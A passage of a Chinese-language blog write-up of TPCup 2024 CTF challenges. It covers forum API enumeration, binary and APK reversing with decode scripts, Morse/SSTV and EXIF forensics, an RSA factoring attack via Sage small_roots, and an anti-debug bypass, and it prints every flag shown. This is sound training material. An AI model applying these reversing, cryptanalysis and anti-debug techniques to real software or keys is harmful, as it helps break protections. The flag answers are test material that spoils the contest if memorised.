class="punctuation">:</span><span class="string">&quot;哈尔滨工业大学&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_2&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_3&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_4&quot;</span><span class="punctuation">:</span><span class="string">&quot;403&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_5&quot;</span><span class="punctuation">:</span><span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_6&quot;</span><span class="punctuation">:</span><span class="string">&quot;6de68c6722e84ac0a541745e94b7dca0-LROR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_7&quot;</span><span class="punctuation">:</span><span class="string">&quot;91440403MACK9P7J40&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><del>XX，一道都做不出来，重开吧</del><br><code>全做出来了！这是flag1flag&#123;I_L0v3_tP4sK&#125;这是flag2flag&#123;very_go0d_questOnS&#125;</code></p><blockquote><p>中英文没空格差评</p></blockquote><h2 id="躺平论坛"><a href="#躺平论坛" class="headerlink" title="躺平论坛"></a>躺平论坛</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>F12 Find flag1</p><p><code>flag&#123;we1cc0m3_t0_taN6P4ng_f0Rum&#125;</code></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 要找到有 flag 的 discussion，但说不能批量尝试（<br>看了下 flarum 的查询接口，默认一次 20 条有点慢，总共 1048 条要试 53 。但猜测它有 limit 参数可以控制数量，测试发现一次最多 50 条，只要发 21 次就能找到了<br>连接： <a href="https://forum.tpcup.org/api/discussions?page%5Boffset%5D=450&page%5Blimit%5D=50">&#x2F;api&#x2F;discussions?page[offset]&#x3D;450&amp;page[limit]&#x3D;50</a></p><p>看到 flag 才知道预期解是看 sitemap<br>可以从 <a href="https://forum.tpcup.org/sitemap.xml">&#x2F;sitemap.xml</a> 到 <a href="https://forum.tpcup.org/sitemap-live/1">&#x2F;sitemap-live&#x2F;1</a> 到 <a href="https://forum.tpcup.org/d/566-flag">&#x2F;d&#x2F;566-flag</a> 找到 flag</p><p><code>flag&#123;1_C5n_F1n5_f14G_Fr0m_s1t3m4p&#125;</code></p><h2 id="HIT-准入认证"><a href="#HIT-准入认证" class="headerlink" title="HIT! 准入认证!"></a>HIT! 准入认证!</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>flag1 查看字符串</p><p><code>flag&#123;ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t&#125;</code></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>分析 sub_1165 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1165</span><span class="params">(__int64 a1, <span class="type">char</span> a2, __int64 a3, __int64 a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a4) = a2 * *(_BYTE *)((<span class="type">int</span>)i + a1) + *(_BYTE *)((<span class="type">int</span>)i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把 a1 字符每一位乘以 233 加上 a3 数组对应位的值模 256。sub_125E 函数是 base64 换表编码。</p><p>base64 码表：<code>asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&amp;*(-?</code></p><p>base64 密文：<code>%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.</code></p><p>a3 数组对应的是 unk_4060，可以直接从跟踪中获取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a3 = [<span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xcd</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x9e</span>, <span class="number">0x79</span>, <span class="number">0xf1</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xc</span>, <span class="number">0xdb</span>, <span class="number">0x6f</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0xdd</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xe2</span>, <span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x26</span>, <span class="number">0x83</span>, <span class="number">0xbe</span>, <span class="number">0xb8</span>, <span class="number">0x70</span>, <span class="number">0xaa</span>, <span class="number">0x4a</span>, <span class="number">0x90</span>, <span class="number">0x58</span>]</span><br><span class="line">a1= [<span class="number">0xd7</span>, <span class="number">0x55</span>, <span class="number">0x16</span>, <span class="number">0xd1</span>, <span class="number">0x6d</span>, <span class="number">0xad</span>, <span class="number">0x21</span>, <span class="number">0x5c</span>, <span class="number">0xeb</span>, <span class="number">0xc1</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x9b</span>, <span class="number">0xb6</span>, <span class="number">0x60</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x8a</span>, <span class="number">0x73</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0xd6</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x15</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x1d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (j * <span class="number">233</span> + a3[i]) % <span class="number">256</span> == a1[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;7h3_hIT_LilaC_is_s0_N1c3!!&#125;</code></p><h2 id="bepbep"><a href="#bepbep" class="headerlink" title="bepbep"></a>bepbep</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>morse2ascii 你值得拥有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">❯ morse2ascii morse.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open morse.wav</span><br><span class="line">wave size      597040</span><br><span class="line">format tag     1</span><br><span class="line">channels:      1</span><br><span class="line">samples/sec:   8000</span><br><span class="line">avg/bytes/sec: 8000</span><br><span class="line">block align:   1</span><br><span class="line">bits:          8</span><br><span class="line">samples:       597040</span><br><span class="line">bias adjust:   0</span><br><span class="line">volume peaks:  -31744 31744</span><br><span class="line">normalize:     1023</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))</span><br></pre></td></tr></table></figure><p><code>flag&#123;g3t_f14g_fr0m_mor3ecad3&#125;</code></p><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 是 SSTV，用 Qsstv 接收图像</p><p>flag{SSTV_IS_VERY_INTERESTING}</p><blockquote><p>HEN HAO DE JIE MI AI LAI ZI TANG PING BEI</p></blockquote><h2 id="我朝，大盒"><a href="#我朝，大盒" class="headerlink" title="我朝，大盒"></a>我朝，大盒</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>问题1：图片中的位置附近有一条高速公路 请给出高速公路编号[G+两位数字]</p></blockquote><p>下载照片到手机，有提供 GPS 信息，直接定位。</p><blockquote><p>问题2：图片所在位置最近的市是哪个[XX(X)市]</p></blockquote><p>同上，地图可看</p><blockquote><p>问题3：图片采用的ISO感光度是多少</p></blockquote><p>看下 exif iso</p><h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>在 <a href="http://cnrail.geogv.org/zhcn/station/41060731">中国铁路地图 cnrail.geogv.org</a> 找下 漳县、陇南、广元这几个站，结合短信时间尝试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans1&quot;</span><span class="punctuation">:</span><span class="string">&quot;G75&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans2&quot;</span><span class="punctuation">:</span><span class="string">&quot;阆中市&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans3&quot;</span><span class="punctuation">:</span><span class="string">&quot;138&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans4&quot;</span><span class="punctuation">:</span><span class="string">&quot;D206&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">这是flag1flag<span class="punctuation">&#123;</span>wHO0ps_woc50_he<span class="punctuation">&#125;</span></span><br><span class="line">这是flag2flag<span class="punctuation">&#123;</span>a1_lA1_zI_gU0_T</span><br></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>答错出题人了，悲（</p></blockquote><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>【数据删除】<del>(来自群聊天记录）</del></p><h2 id="躺平聊天室2-0"><a href="#躺平聊天室2-0" class="headerlink" title="躺平聊天室2.0"></a>躺平聊天室2.0</h2><p>用 jadx-gui 逆向 apk，在 com.zhizi42.tpc2024.MainActivity 找到主要逻辑</p><h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>直接查看字符串</p><p><code>flag&#123;Th1s_1s_s0_s1mp1e&#125;</code></p><h3 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>base64 解码 <code>ZmxhZ3tmbGFnYmFzZTY0fQ==</code><br><code>flag&#123;flagbase64&#125;</code></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>点开 t2 可找到<br>AES&#x2F;ECB&#x2F;PKCS5Padding 解密 <code>e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=</code>，密钥是 flag2<br><code>flag&#123;alldone!!!&#125;</code></p><h2 id="主唱太拼命了"><a href="#主唱太拼命了" class="headerlink" title="主唱太拼命了"></a>主唱太拼命了</h2><p>RSA 已知部分高位攻击，但教程一般给的是已知 p 高位，没有已知 p+q 高位的解法<br>这里 <a href="https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage">https://github.com/7feilee/ctf_writeup&#x2F;blob&#x2F;master&#x2F;2020&#x2F;HITCTF&#x2F;crypto_dgk&#x2F;src&#x2F;solve.sage</a> 提供了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br></pre></td></tr></table></figure><p>稍微改了一下脚本用 sage 求解 p 和 q</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">p_add_q = <span class="number">19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848</span></span><br><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">poly = p_pro + x</span><br><span class="line">x0 = poly.small_roots(X = <span class="number">2</span> ** <span class="number">100</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(gcd(p_pro + x0[<span class="number">0</span>], n))</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>求得 p 和 q 后可以解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, inverse</span><br><span class="line"></span><br><span class="line">c = <span class="number">18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">e = bytes_to_long(<span class="string">b&quot;too desperate!&quot;</span>)</span><br><span class="line">p = <span class="number">10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047</span></span><br><span class="line">q = <span class="number">9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>flag&#123;th3_w0rld_1s_An0n_t0ky0&#125;</code></p><h2 id="投稿-CrackMe"><a href="#投稿-CrackMe" class="headerlink" title="[投稿]CrackMe"></a>[投稿]CrackMe</h2><p>由于是静态 flag，因此只要绕过调试检测后 (在 <code>isDebuggerPresent</code>、<code>anti_debugger</code> 判断处下断点返回值改成 0)，在 <code>RSADecryptor</code> 函数部分下断点获取 v4 的值就是 flag</p><p><code>flag&#123;Xyu_h0is_z7Qs_l0VE&#125;</code></p></div><hr><div class="reprint" id="reprint-statement"><div class="reprint__author"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-user">文章作者: </i></span><span class="reprint-info"><a href="/about" rel="external nofollow noreferrer">W3nL0u</a></span></div><div class="reprint__type"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-link">文章链接: </i></span><span class="reprint-info"><a href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/">https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/</a></span></div><div class="reprint__notice"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-copyright">版权声明: </i></span><span class="reprint-info">本博客所有文章除特別声明外，均采用 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a> 许可协议。转载请注明来源 <a href="/about" target="_blank">W3nL0u</a> !</span></div></div><script async defer>function navToReprintStatement(){$("html, body").animate({scrollTop:$("#reprint-statement").offset().top-80},800)}document.addEventListener("copy",function(t){M.toast({html:'<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>'})})</script><div class="tag_share" style="display:block"><div class="post-meta__tag-list" style="display:inline-block"><div class="article-tag"><span class="chip bg-color">无标签</span></div></div><div class="post_share" style="zoom:80%;width:fit-content;display:inline-block;float:right;margin:-.15rem 0"><link rel="stylesheet" href="/libs/share/css/share.min.css"><div id="article-share"><div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div><script src="/libs/share/js/social-share.min.js"></script></div></div></div></div></div><article id="prenext-posts" class="prev-next articles"><div class="row article-row"><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge left-badge text-color"><i class="fas fa-chevron-left"></i>&nbsp;上一篇</div><div class="card"><a href="/2024/02/26/sictf2024/"><div class="card-image"><img src="/medias/featureimages/23.jpg" class="responsive-img" alt="SICTF2024"> <span class="card-title">SICTF2024</span></div></a><div class="card-content article-content"><div class="summary block-with-text"></div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2024-02-26 </span><span class="publish-author"><i class="fas fa-user fa-fw"></i> W3nL0u</span></div></div><div class="card-action article-tags"><a href="/tags/CTF/"><span class="chip bg-color">CTF</span></a></div></div></div><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge right-badge text-color">下一篇&nbsp;<i class="fas fa-chevron-right"></i></div><div class="card"><a href="/2024/02/26/deng-shi-wen-ti-he-z3-shi-yong/"><div class="card-image"><img src="/medias/featureimages/14.jpg" class="responsive-img" alt="等式问题与z3的使用"> <span class="card-title">等式问题与z3的使用</span></div></a><div class="card-content article-content"><div class="summary block-with-text"></div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2024-02-26 </span><span class="publish-author"><i class="fas fa-user fa-fw"></i> W3nL0u</span></div></div><div class="card-action article-tags"><a href="/tags/Z3-RE-CTF/"><span class="chip bg-color">Z3 RE CTF</span></a></div></div></div></div></article></div><script src="/libs/codeBlock/codeBlockFuction.js"></script><script src="/libs/codeBlock/codeLang.js"></script><script src="/libs/codeBlock/codeCopy.js"></script><script src="/libs/codeBlock/codeShrink.js"></script></div><div id="toc-aside" class="expanded col l3 hide-on-med-and-down"><div class="toc-widget card" style="background-color:#fff"><div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div><div id="toc-content"></div></div></div></div><div id="floating-toc-btn" class="hide-on-med-and-down"><a class="btn-floating btn-large bg-color"><i class="fas fa-list-ul"></i></a></div><script src="/libs/tocbot/tocbot.min.js"></script><script>$(function(){tocbot.init({tocSelector:"#toc-content",contentSelector:"#articleContent",headingsOffset:-(.4*$(window).height()-45),collapseDepth:Number("0"),headingSelector:"h2, h3, h4"});let t=parseInt(.4*$(window).height()-64),e=$(".toc-widget"),n=($(window).scroll(function(){$(window).scrollTop()>t?e.addClass("toc-fixed"):e.removeClass("toc-fixed")}),"expanded"),i=$("#toc-aside"),l=$("#main-content");$("#floating-toc-btn .btn-floating").click(function(){i.hasClass(n)?(i.removeClass(n).hide(),l.removeClass("l9")):(i.addClass(n).show(),l.addClass("l9"));var e="artDetail",o="prenext-posts";if(0!==(e=$("#"+e)).length){let t=e.width();450<=t?t+=21:350<=t&&t<450?t+=18:300<=t&&t<350?t+=16:t+=14,$("#"+o).width(t)}})})</script></main><footer class="page-footer bg-color"><div class="container row center-align" style="margin-bottom:0!important"><div class="col s12 m8 l8 copy-right">Copyright&nbsp;&copy; <span id="year">2019-2024</span> <a href="/about" target="_blank">W3nL0u</a> |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a> |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a><br><span id="busuanzi_container_site_pv">&nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp; <span id="busuanzi_value_site_pv" class="white-color"></span> </span><span id="busuanzi_container_site_uv">&nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp; <span id="busuanzi_value_site_uv" class="white-color"></span></span><br><br></div><div class="col s12 m4 l4 social-link social-statis"><a href="https://github.com/xyy9233" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50"><i class="fab fa-github"></i> </a><a href="mailto:1768765226@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50"><i class="fas fa-envelope-open"></i> </a><a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1768765226" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1768765226" data-position="top" data-delay="50"><i class="fab fa-qq"></i> </a><a href="https://www.zhihu.com/people/hen-lan-de-xue-ba" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/hen-lan-de-xue-ba" data-position="top" data-delay="50"><i class="fab fa-zhihu1">知</i> </a><a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50"><i class="fas fa-rss"></i></a></div></div></footer><div class="progress-bar"></div><div id="searchModal" class="modal"><div class="modal-content"><div class="search-header"><span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span> <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input"></div><div id="searchResult"></div></div></div><script>$(function(){var e,r,s;e="/search.xml",r="searchInput",s="searchResult",$.ajax({url:e,dataType:"xml",success:function(e){var t=$("entry",e).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get(),e=document.getElementById(r),n=document.getElementById(s);e.addEventListener("input",function(){var o='<ul class="search-result-list">',h=this.value.trim().toLowerCase().split(/[\s\-]+/);n.innerHTML="",this.value.trim().length<=0||(t.forEach(function(e){var n,t,r,s=!0,a=e.title.trim().toLowerCase(),l=e.content.trim().replace(/<[^>]+>/g,"").toLowerCase(),i=0===(i=e.url).indexOf("/")?e.url:"/"+i,c=-1,u=-1;""!==a&&""!==l&&h.forEach(function(e,t){n=a.indexOf(e),c=l.indexOf(e),n<0&&c<0?s=!1:(c<0&&(c=0),0===t&&(u=c))}),s&&(o+="<li><a href='"+i+"' class='search-result-title'>"+a+"</a>",i=e.content.trim().replace(/<[^>]+>/g,""),0<=u&&(e=u+80,(e=0===(t=(t=u-20)<0?0:t)?100:e)>i.length&&(e=i.length),r=i.substr(t,e),h.forEach(function(e){var t=new RegExp(e,"gi");r=r.replace(t,'<em class="search-keyword">'+e+"</em>")}),o+='<p class="search-result">'+r+"...</p>"),o+="</li>")}),o+="</ul>",n.innerHTML=o)})}})})</script><div class="stars-con"><div id="stars"></div><div id="stars2"></div><div id="stars3"></div></div><script>function switchNightMode(){$('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($("body")),setTimeout(function(){$("body").hasClass("DarkMode")?($("body").removeClass("DarkMode"),localStorage.setItem("isDark","0"),$("#sum-moon-icon").removeClass("fa-sun").addClass("fa-moon")):($("body").addClass("DarkMode"),localStorage.setItem("isDark","1"),$("#sum-moon-icon").addClass("fa-sun").removeClass("fa-moon")),setTimeout(function(){$(".Cuteen_DarkSky").fadeOut(1e3,function(){$(this).remove()})},2e3)})}</script><div id="backTop" class="top-scroll"><a class="btn-floating btn-large waves-effect waves-light" href="#!"><i class="fas fa-arrow-up"></i></a></div><script src="/libs/materialize/materialize.min.js"></script><script src="/libs/masonry/masonry.pkgd.min.js"></script><script src="/libs/aos/aos.js"></script><script src="/libs/scrollprogress/scrollProgress.min.js"></script><script src="/libs/lightGallery/js/lightgallery-all.min.js"></script><script src="/js/matery.js"></script><script>var windowWidth=$(window).width();768<windowWidth&&document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>')</script><script src="https://ssl.captcha.qq.com/TCaptcha.js"></script><script src="/libs/others/TencentCaptcha.js"></script><button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button><script>(()=>{var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js",(e=document.getElementsByTagName("script")[0]).parentNode.insertBefore(t,e)})()</script><script src="/libs/others/clicklove.js" async></script><script async src="/libs/others/busuanzi.pure.mini.js"></script><script src="/libs/instantpage/instantpage.js" type="module"></script></body></html>